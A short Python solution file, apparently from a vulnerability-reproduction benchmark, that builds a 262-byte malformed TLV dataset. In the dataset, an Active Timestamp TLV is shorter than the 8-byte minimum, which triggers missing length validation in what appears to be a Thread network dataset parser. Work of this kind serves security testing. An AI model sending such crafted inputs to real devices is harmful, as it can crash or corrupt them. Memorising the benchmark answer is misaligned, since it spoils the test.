import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a dataset with invalid Active Timestamp TLV (type 0x09)
        # TLV format: [Type:1][Length:1][Value:var]
        # Vulnerability: Minimum required length (8) not validated
        active_ts_tlv = b'\x09\x01\x00'  # Type=ActiveTimestamp, Length=1 (<8), Value=0x00
        
        # Create a dataset with minimal valid TLVs to reach target length
        # Using Channel TLV (type=0) and Network Name TLV (type=1) as padding
        channel_tlv = b'\x00\x01\x00'  # Channel, Length=1, Value=0
        network_name_tlv = b'\x01\xfe' + b'\x00' * 254  # NetworkName, Length=254
        
        # Combine to reach 262 bytes (ground-truth length)
        poc = channel_tlv + network_name_tlv + active_ts_tlv
        
        # Ensure exact length of 262 bytes
        if len(poc) < 262:
            poc += b'\x00' * (262 - len(poc))
        else:
            poc = poc[:262]
        
        return poc
